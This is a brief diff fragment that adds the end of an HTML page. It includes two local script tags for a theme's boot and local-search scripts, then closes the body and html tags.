+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
